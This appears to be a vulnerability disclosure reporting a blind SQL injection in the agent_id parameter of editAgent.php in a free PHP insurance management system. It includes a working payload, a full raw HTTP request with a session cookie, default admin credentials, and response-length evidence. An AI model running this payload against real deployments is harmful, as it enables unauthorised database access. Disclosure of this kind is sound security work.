# Insurance Management System v1.0 by oretnom23 has SQL injection

Author： k0xx

vendors: https://itsourcecode.com/free-projects/php-project/insurance-management-system-project-in-php-free-download/

Login account: ahmed/12345 (Super Admin account)

Vulnerability File: /insurance/editAgent.php?agent_id=

Vulnerability location: /insurance/editAgent.php?agent_id=,agent_id

[+] Payload: /insurance/editAgent.php?agent_id=1610%27%20and%20length(database())%20=4%20--+ // Leak place ---> agent_id

Current database name: lims,length is 4

```sql
GET /insurance/editAgent.php?agent_id=1610%27%20and%20length(database())%20=4%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=tmbv0mt5ff9hphhe0mtv4sghfq
Connection: close
```

When length (database ()) = 3, Content-Length: 4385
![image](https://user-images.githubusercontent.com/54017627/166145342-de13b85a-2b57-4bbb-965c-57ab2c112997.png)

![image](https://user-images.githubusercontent.com/54017627/166145367-171f1c7d-e131-4794-b86d-f9f45964e16a.png)


When length (database ()) = 4, Content-Length: 4893

![image](https://user-images.githubusercontent.com/54017627/166145338-f342cbe4-3028-4bcf-953c-89ff90af5d06.png)

![image](https://user-images.githubusercontent.com/54017627/166145358-c260dda4-4ba1-4fdf-b555-24a486f86e99.png)


